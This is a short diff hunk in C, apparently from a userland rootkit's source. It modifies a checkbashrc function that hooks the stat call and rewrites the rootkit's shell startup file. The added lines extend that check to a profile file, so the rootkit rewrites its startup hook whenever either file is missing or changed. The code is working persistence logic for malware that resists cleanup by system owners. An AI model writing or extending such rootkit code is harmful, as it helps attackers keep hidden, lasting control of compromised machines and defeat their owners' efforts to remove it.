@@ -46,12 +46,20 @@ void checkbashrc(void){
     if(!rkprocup())
         return;
 
-    struct stat rcstat;
+    struct stat rcstat, prstat;
     memset(&rcstat, 0, sizeof(struct stat));
+    memset(&prstat, 0, sizeof(struct stat));
+
     hook(C__XSTAT);
 
     int statstat = (long)call(C__XSTAT, _STAT_VER, BASHRC_PATH, &rcstat);
     if((statstat < 0 && errno == ENOENT) || (statstat != -1 && rcstat.st_size != RKBASHRC_SIZE)){
+        writebashrc();
+        return;
+    }
+
+    statstat = (long)call(C__XSTAT, _STAT_VER, PROFILE_PATH, &prstat);
+    if((statstat < 0 && errno == ENOENT) || (statstat != -1 && prstat.st_size != RKBASHRC_SIZE)){
         writebashrc();
         return;
     }
